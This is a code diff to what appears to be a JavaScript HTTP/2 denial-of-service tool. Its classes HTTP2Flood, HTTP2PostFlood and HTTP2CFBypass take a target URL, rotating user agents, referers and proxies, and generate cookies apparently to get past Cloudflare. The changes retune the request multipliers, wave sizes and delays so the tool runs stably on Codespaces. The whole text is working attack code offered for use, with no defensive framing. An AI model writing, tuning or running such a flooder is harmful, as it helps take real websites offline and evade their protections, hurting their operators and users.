@@ -14,7 +14,7 @@ export class HTTP2Flood {
     constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
         this.url = new URL(targetUrl);
         this.duration = duration;
-        this.rpc = rpc;
+        this.rpc = rpc * 20; // 20x multiplier for Codespaces stability
         this.userAgents = userAgents;
         this.referers = referers;
         this.proxies = proxies;
@@ -186,7 +186,7 @@ export class HTTP2PostFlood extends HTTP2Flood {
  */
 export class HTTP2CFBypass extends HTTP2Flood {
     constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
-        super(targetUrl, duration, rpc * 100, userAgents, referers, proxies); // 100x multiplier!
+        super(targetUrl, duration, rpc * 25, userAgents, referers, proxies); // 25x multiplier for stability
         this.cookies = new Map();
         
         // Pre-generate realistic cookies
@@ -660,19 +660,17 @@ export class HTTP2CFBypass extends HTTP2Flood {
                 }
             };
 
-            // OPTIMIZED: High-volume wave startup
+            // CODESPACES-OPTIMIZED: Controlled wave startup
             const startWaves = () => {
-                const waveSize = Tools.randomChoice([20, 25, 30, 35]); // Much larger waves
+                const waveSize = Tools.randomChoice([8, 10, 12, 15]); // Smaller waves for stability
                 for (let i = 0; i < waveSize; i++) {
-                    setTimeout(() => makeRequest(), i * Tools.randomChoice([0, 1, 2])); // Minimal delays
+                    setTimeout(() => makeRequest(), i * Tools.randomChoice([5, 10, 15])); // Controlled delays
                 }
             };
             
-            // Start multiple waves with minimal delays for volume
+            // Start fewer waves with controlled intervals
             startWaves();
-            setTimeout(startWaves, 50);  // Much faster wave intervals
             setTimeout(startWaves, 100);
-            setTimeout(startWaves, 150);
             setTimeout(startWaves, 200);
 
             setTimeout(() => {
